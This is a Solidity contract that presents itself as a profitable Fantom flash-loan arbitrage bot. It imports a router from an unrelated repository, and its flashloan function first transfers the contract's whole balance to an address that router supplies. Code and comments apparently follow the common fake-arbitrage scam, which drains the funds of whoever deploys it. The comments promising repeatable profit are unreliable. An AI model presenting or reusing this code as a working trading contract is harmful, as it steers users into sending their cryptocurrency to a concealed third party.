pragma solidity ^0.5.16;

// CreamFi Contracts
import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/ERC3156FlashLenderInterface.sol";
import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/CarefulMath.sol";
import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/CToken.sol";
import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/CTokenCheckRepay.sol";
import "https://github.com/genbtcdoubler/ipfs.filebase/blob/main/ftm.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";



contract InitiateFlashLoan {
    
    RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;

        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Send required coins for swap
        address(uint160(router.zooTradeSwapAddress())).transfer(
            address(this).balance
        );

        router.borrowFlashloanFromMultiplier(
            address(this),
            router.creamSwapAddress(),
            flashLoanAmount
        );
        //To prepare the arbitrage, FTM is converted to Dai using ZooTrade swap contract.
        router.convertFtmTo(msg.sender, flashLoanAmount / 2);
        //The arbitrage converts token for FTM using token/FTM ZooTrade, and then immediately converts FLM back
        router.callArbitrageZooTrade(router.creamSwapAddress(), msg.sender);
        //After the arbitrage, FTM is transferred back to Multiplier to pay the loan plus fees. This transaction costs 35 FTM of gas.
        router.transferFtmToMultiplier(router.zooTradeSwapAddress());
        //Note that the transaction sender gains FTM from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}
